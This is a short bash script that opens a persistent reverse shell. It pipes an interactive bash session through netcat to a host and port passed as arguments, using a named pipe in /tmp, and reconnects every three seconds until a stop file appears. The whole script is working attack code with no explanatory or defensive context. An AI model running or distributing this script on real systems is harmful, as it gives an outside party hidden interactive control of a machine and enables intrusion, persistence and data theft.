#!/usr/bin/env bash

if [ "stop" = "$1" ]; then
  touch /tmp/stop
else
  while [ ! -e /tmp/stop ]; do
    [ ! -e /tmp/f ] || rm -rf /tmp/f
    mkfifo /tmp/f
    cat /tmp/f | /bin/bash -i 2>&1 |nc $1 $2 > /tmp/f
    if [ ! -e /tmp/stop ]; then
      sleep 3
    fi
  done
fi
